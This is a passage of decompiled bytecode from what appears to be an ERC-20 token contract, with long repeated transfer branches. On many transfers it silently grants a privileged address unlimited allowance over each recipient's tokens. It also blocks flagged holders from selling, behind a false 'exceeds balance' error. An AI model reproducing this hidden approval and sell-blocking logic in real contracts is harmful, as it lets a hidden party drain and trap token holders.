                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1663), stor12);
                else:
                    if mem[(32 * idx) + 140 len 20] == _owner:
                        if _owner != msg.sender:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1098 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1098] = 38
                            mem[_1098 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _989 > balanceOf[address(msg.sender)]:
                                _1179 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_1179 + idx + 68] = mem[_1098 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1179 + 100] = mem[_1179 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1179 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _989
                            if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_987)
                            mem[32] = 0
                            balanceOf[address(_987)] += _989
                            mem[mem[64]] = _989
                            emit Transfer(_989, msg.sender, address(_987));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1642 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1642), stor12);
                        else:
                            if mem[(32 * idx) + 140 len 20] != msg.sender:
                                if not msg.sender:
                                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                _1141 = mem[64]
                                mem[64] = mem[64] + 96
                                mem[_1141] = 38
                                mem[_1141 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                mem[32] = 0
                                if _989 > balanceOf[address(msg.sender)]:
                                    _1220 = mem[64]
                                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                    mem[mem[64] + 4] = 32
                                    mem[mem[64] + 36] = 38
                                    idx = 0
                                    while idx < 38:
                                        mem[_1220 + idx + 68] = mem[_1141 + idx + 32]
                                        idx = idx + 32
                                        continue 
                                    mem[_1220 + 100] = mem[_1220 + 126 len 6]
                                    revert with memory
                                      from mem[64]
                                       len _1220 + -mem[64] + 132
                                balanceOf[address(msg.sender)] -= _989
                                if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                    revert with 0, 'SafeMath: addition overflow'
                                mem[0] = address(_987)
                                mem[32] = 0
                                balanceOf[address(_987)] += _989
                                mem[mem[64]] = _989
                                emit Transfer(_989, msg.sender, address(_987));
                                if idx < arg1:
                                    require idx < mem[96]
                                    stor1[mem[(32 * idx) + 140 len 20]] = 1
                                    require idx < mem[96]
                                    _1664 = mem[(32 * idx) + 128]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                    if not stor12:
                                        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                    mem[0] = stor12
                                    mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                    allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                    mem[mem[64]] = -1
                                    emit Approval(-1, address(_1664), stor12);
                            else:
                                stor3 = mem[(32 * idx) + (32 * arg2.length) + 160]
                                if not msg.sender:
                                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                _1182 = mem[64]
                                mem[64] = mem[64] + 96
                                mem[_1182] = 38
                                mem[_1182 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                mem[32] = 0
                                if _989 > balanceOf[address(msg.sender)]:
                                    _1268 = mem[64]
                                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                    mem[mem[64] + 4] = 32
                                    mem[mem[64] + 36] = 38
                                    idx = 0
                                    while idx < 38:
                                        mem[_1268 + idx + 68] = mem[_1182 + idx + 32]
                                        idx = idx + 32
                                        continue 
                                    mem[_1268 + 100] = mem[_1268 + 126 len 6]
                                    revert with memory
                                      from mem[64]
                                       len _1268 + -mem[64] + 132
                                balanceOf[address(msg.sender)] -= _989
                                if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                    revert with 0, 'SafeMath: addition overflow'
                                mem[0] = address(_987)
                                mem[32] = 0
                                balanceOf[address(_987)] += _989
                                mem[mem[64]] = _989
                                emit Transfer(_989, msg.sender, address(_987));
                                if idx < arg1:
                                    require idx < mem[96]
                                    stor1[mem[(32 * idx) + 140 len 20]] = 1
                                    require idx < mem[96]
                                    _1699 = mem[(32 * idx) + 128]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                    if not stor12:
                                        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                    mem[0] = stor12
                                    mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                    allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                    mem[mem[64]] = -1
                                    emit Approval(-1, address(_1699), stor12);
                    else:
                        mem[0] = msg.sender
                        mem[32] = 1
                        if bool(stor1[address(msg.sender)]) == 1:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1062 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1062] = 38
                            mem[_1062 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _989 > balanceOf[address(msg.sender)]:
                                _1138 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_1138 + idx + 68] = mem[_1062 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1138 + 100] = mem[_1138 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1138 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _989
                            if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_987)
                            mem[32] = 0
                            balanceOf[address(_987)] += _989
                            mem[mem[64]] = _989
                            emit Transfer(_989, msg.sender, address(_987));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1641 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1641), stor12);
                        else:
                            mem[0] = msg.sender
                            mem[32] = 2
                            if bool(stor2[address(msg.sender)]) == 1:
                                if msg.sender == stor11:
                                    if not msg.sender:
                                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                    _1175 = mem[64]
                                    mem[64] = mem[64] + 96
                                    mem[_1175] = 38
                                    mem[_1175 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                    mem[32] = 0
                                    if _989 > balanceOf[address(msg.sender)]:
                                        _1258 = mem[64]
                                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                        mem[mem[64] + 4] = 32
                                        mem[mem[64] + 36] = 38
                                        idx = 0
                                        while idx < 38:
                                            mem[_1258 + idx + 68] = mem[_1175 + idx + 32]
                                            idx = idx + 32
                                            continue 
                                        mem[_1258 + 100] = mem[_1258 + 126 len 6]
                                        revert with memory
                                          from mem[64]
                                           len _1258 + -mem[64] + 132
                                    balanceOf[address(msg.sender)] -= _989
                                    if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                        revert with 0, 'SafeMath: addition overflow'
                                    mem[0] = address(_987)
                                    mem[32] = 0
                                    balanceOf[address(_987)] += _989
                                    mem[mem[64]] = _989
                                    emit Transfer(_989, msg.sender, address(_987));
                                    if idx < arg1:
                                        require idx < mem[96]
                                        stor1[mem[(32 * idx) + 140 len 20]] = 1
                                        require idx < mem[96]
                                        _1765 = mem[(32 * idx) + 128]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                        if not stor12:
                                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                        mem[0] = stor12
                                        mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                        allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                        mem[mem[64]] = -1
                                        emit Approval(-1, address(_1765), stor12);
                                else:
                                    if mem[(32 * idx) + 140 len 20] != stor12:
                                        revert with 0, 32, 38, 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[mem[64] + 106 len 26]
                                    if not msg.sender:
                                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                    _1215 = mem[64]
                                    mem[64] = mem[64] + 96
                                    mem[_1215] = 38
                                    mem[_1215 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                    mem[32] = 0
                                    if _989 > balanceOf[address(msg.sender)]:
                                        _1317 = mem[64]
                                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                        mem[mem[64] + 4] = 32
                                        mem[mem[64] + 36] = 38
                                        idx = 0
                                        while idx < 38:
                                            mem[_1317 + idx + 68] = mem[_1215 + idx + 32]
                                            idx = idx + 32
                                            continue 
                                        mem[_1317 + 100] = mem[_1317 + 126 len 6]
                                        revert with memory
                                          from mem[64]
                                           len _1317 + -mem[64] + 132
                                    balanceOf[address(msg.sender)] -= _989
                                    if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                        revert with 0, 'SafeMath: addition overflow'
                                    mem[0] = address(_987)
                                    mem[32] = 0
                                    balanceOf[address(_987)] += _989
                                    mem[mem[64]] = _989
                                    emit Transfer(_989, msg.sender, address(_987));
                                    if idx < arg1:
                                        require idx < mem[96]
                                        stor1[mem[(32 * idx) + 140 len 20]] = 1
                                        require idx < mem[96]
                                        _1812 = mem[(32 * idx) + 128]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                        if not stor12:
                                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                        mem[0] = stor12
                                        mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                        allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                        mem[mem[64]] = -1
                                        emit Approval(-1, address(_1812), stor12);
                            else:
                                if mem[(32 * idx) + (32 * arg2.length) + 160] >= stor3:
                                    if msg.sender == stor11:
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1211 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1211] = 38
                                        mem[_1211 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _989 > balanceOf[address(msg.sender)]:
                                            _1307 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_1307 + idx + 68] = mem[_1211 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1307 + 100] = mem[_1307 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1307 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _989
                                        if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_987)
                                        mem[32] = 0
                                        balanceOf[address(_987)] += _989
                                        mem[mem[64]] = _989
                                        emit Transfer(_989, msg.sender, address(_987));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1842 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1842), stor12);
                                    else:
                                        if mem[(32 * idx) + 140 len 20] != stor12:
                                            revert with 0, 32, 38, 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[mem[64] + 106 len 26]
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1253 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1253] = 38
                                        mem[_1253 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _989 > balanceOf[address(msg.sender)]:
                                            _1373 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_1373 + idx + 68] = mem[_1253 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1373 + 100] = mem[_1373 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1373 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _989
                                        if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_987)
                                        mem[32] = 0
                                        balanceOf[address(_987)] += _989
                                        mem[mem[64]] = _989
                                        emit Transfer(_989, msg.sender, address(_987));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1864 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1864), stor12);
                                else:
                                    if mem[(32 * idx) + 140 len 20] != stor11:
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1173 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1173] = 38
                                        mem[_1173 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _989 > balanceOf[address(msg.sender)]:
                                            _1255 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_1255 + idx + 68] = mem[_1173 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1255 + 100] = mem[_1255 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1255 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _989
                                        if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_987)
                                        mem[32] = 0
                                        balanceOf[address(_987)] += _989
                                        mem[mem[64]] = _989
                                        emit Transfer(_989, msg.sender, address(_987));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1808 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1808), stor12);
                                    else:
                                        stor2[address(msg.sender)] = 1
                                        mem[0] = msg.sender
                                        mem[32] = 1
                                        stor1[address(msg.sender)] = 0
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1213 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1213] = 38
                                        mem[_1213 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _989 > balanceOf[address(msg.sender)]:
                                            _1312 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_1312 + idx + 68] = mem[_1213 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1312 + 100] = mem[_1312 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1312 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _989
                                        if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_987)
                                        mem[32] = 0
                                        balanceOf[address(_987)] += _989
                                        mem[mem[64]] = _989
                                        emit Transfer(_989, msg.sender, address(_987));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1846 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1846), stor12);
        else:
            if msg.sender == _owner:
                stor11 = mem[(32 * idx) + 140 len 20]
                if not msg.sender:
                    revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                if not mem[(32 * idx) + 140 len 20]:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                _997 = mem[64]
                mem[64] = mem[64] + 96
                mem[_997] = 38
                mem[_997 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                mem[32] = 0
                if _989 > balanceOf[address(msg.sender)]:
                    _1008 = mem[64]
                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                    mem[mem[64] + 4] = 32
                    mem[mem[64] + 36] = 38
                    idx = 0
                    while idx < 38:
                        mem[_1008 + idx + 68] = mem[_997 + idx + 32]
                        idx = idx + 32
                        continue 
                    mem[_1008 + 100] = mem[_1008 + 126 len 6]
                    revert with memory
                      from mem[64]
                       len _1008 + -mem[64] + 132
                balanceOf[address(msg.sender)] -= _989
                if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                    revert with 0, 'SafeMath: addition overflow'
                mem[0] = address(_987)
                mem[32] = 0
                balanceOf[address(_987)] += _989
                mem[mem[64]] = _989
                emit Transfer(_989, msg.sender, address(_987));
                if idx < arg1:
                    require idx < mem[96]
                    stor1[mem[(32 * idx) + 140 len 20]] = 1
                    require idx < mem[96]
                    _1424 = mem[(32 * idx) + 128]
                    if not mem[(32 * idx) + 140 len 20]:
                        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                    if not stor12:
                        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                    mem[0] = stor12
                    mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                    allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                    mem[mem[64]] = -1
                    emit Approval(-1, address(_1424), stor12);
            else:
                if msg.sender == stor11:
                    if _owner != msg.sender:
                        if not msg.sender:
                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                        if not mem[(32 * idx) + 140 len 20]:
                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                        _1102 = mem[64]
                        mem[64] = mem[64] + 96
                        mem[_1102] = 38
                        mem[_1102 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                        mem[32] = 0
                        if _989 > balanceOf[address(msg.sender)]:
                            _1184 = mem[64]
                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                            mem[mem[64] + 4] = 32
                            mem[mem[64] + 36] = 38
                            idx = 0
                            while idx < 38:
                                mem[_1184 + idx + 68] = mem[_1102 + idx + 32]
                                idx = idx + 32
                                continue 
                            mem[_1184 + 100] = mem[_1184 + 126 len 6]
                            revert with memory
                              from mem[64]
                               len _1184 + -mem[64] + 132
                        balanceOf[address(msg.sender)] -= _989
                        if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                            revert with 0, 'SafeMath: addition overflow'
                        mem[0] = address(_987)
                        mem[32] = 0
                        balanceOf[address(_987)] += _989
                        mem[mem[64]] = _989
                        emit Transfer(_989, msg.sender, address(_987));
                        if idx < arg1:
                            require idx < mem[96]
                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                            require idx < mem[96]
                            _1647 = mem[(32 * idx) + 128]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                            if not stor12:
                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                            mem[0] = stor12
                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                            mem[mem[64]] = -1
                            emit Approval(-1, address(_1647), stor12);
                    else:
                        if mem[(32 * idx) + 140 len 20] != msg.sender:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1143 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1143] = 38
                            mem[_1143 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _989 > balanceOf[address(msg.sender)]:
                                _1225 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_1225 + idx + 68] = mem[_1143 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1225 + 100] = mem[_1225 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1225 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _989
                            if balanceOf[address(_987)] + _989 < balanceOf[address(_987)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_987)
                            mem[32] = 0
                            balanceOf[address(_987)] += _989
                            mem[mem[64]] = _989
                            emit Transfer(_989, msg.sender, address(_987));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1668 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1668), stor12);
                        else:
                            stor3 = mem[(32 * idx) + (32 * arg2.length) + 160]
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1187 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1187] = 38
